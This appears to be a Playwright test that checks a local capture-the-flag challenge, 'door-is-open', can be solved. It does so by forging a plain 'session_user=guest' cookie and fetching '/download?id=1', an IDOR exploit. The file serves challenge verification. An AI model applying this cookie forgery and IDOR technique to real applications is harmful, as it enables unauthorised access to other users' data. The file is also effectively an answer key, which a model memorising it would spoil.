import { test, expect } from '@playwright/test'

const BASE_URL = 'http://localhost:5173/challenge/door-is-open/'
const FLAG_REGEX = /(FLAG|CTF)\{[^}]+\}/
const EXPLOIT_PATH = '/download?id=1'
// IDOR exploit assumes an authenticated session as guest; door-is-open's
// session cookie is plain `session_user=<username>` so we forge it directly
// rather than chaining a real login round-trip.
const SESSION_COOKIE = 'session_user=guest'

test('door-is-open is solvable via /download?id=1', async ({ page }) => {
  await page.goto(BASE_URL)
  await page.waitForFunction(
    () =>
      navigator.serviceWorker.controller !== null &&
      typeof (globalThis as { __wxlDispatch?: unknown }).__wxlDispatch === 'function',
    null,
    { timeout: 120_000 },
  )

  const flagBody = await page.evaluate(
    async ({ downloadPath, sessionCookie }) => {
      const dispatch = (globalThis as unknown as {
        __wxlDispatch?: (req: Request) => Promise<Response>
      }).__wxlDispatch
      if (!dispatch) {
        throw new Error('__wxlDispatch not exposed on the page')
      }
      const base = 'https://challenge-door-is-open.localhost'
      // X-Wxlsh-Cookie is the forbidden-header transport used by the wxl
      // runtime to read cookies (see usePythonRuntime.ts).
      const req = new Request(`${base}${downloadPath}`, {
        method: 'GET',
        headers: { 'X-Wxlsh-Cookie': sessionCookie },
      })
      const r = await dispatch(req)
      return await r.text()
    },
    { downloadPath: EXPLOIT_PATH, sessionCookie: SESSION_COOKIE },
  )

  expect(flagBody.trim()).toMatch(FLAG_REGEX)
})
